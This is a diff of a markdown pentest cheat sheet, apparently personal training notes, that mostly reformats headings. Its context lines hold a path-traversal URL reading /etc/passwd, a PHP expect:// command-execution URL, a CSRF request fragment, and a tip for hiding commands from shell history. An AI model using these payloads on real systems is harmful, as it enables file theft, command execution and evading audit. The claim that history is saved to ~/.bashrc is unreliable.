@@ -8,13 +8,11 @@
 - Include `../` characters to trick parser into accessing directories above the indicated directory, possibly revealing sensitive information.
 
 `http://10.10.10.100/photoalbum/disaply.php?photo=../../../../../../etc/passwd`
-
 ### 1.1.2	PHP WRAPPERS
 
 #### 1.1.2.1	Expect
 
 `http://10.10.10.100/photoalbum/disaply.php?photo=expect://ls`
-
 #### 1.1.2.2	Data
 
 - Inject the PHP code you want directly in the URL
@@ -123,7 +121,7 @@ source: [1]
 
 ### 2.5.1	BURPSUITE COLLABORATOR CLIENT
 
-#### 2.5.1.1	2.5.1.1 
+#### 2.5.1.1	-
 
 `<input name=username id=username>`
 
@@ -273,10 +271,9 @@ changeReq.send('csrf='+token+'&email=test@test.com')
 
 ## 3.1	COMMAND HISTORY
 
-### 
+### 3.1.1	-
 - Commands entered in terminal are tracked using HISTFILE environment variable and written to ~/.bashrc when user logs off.
-
-### 
+### 3.1.2	-
 - Prevent commands being recorded by prepending with a space. Alternatively, use 'set +o history' and 'set -o history'
 
 ## 3.2	SUDO
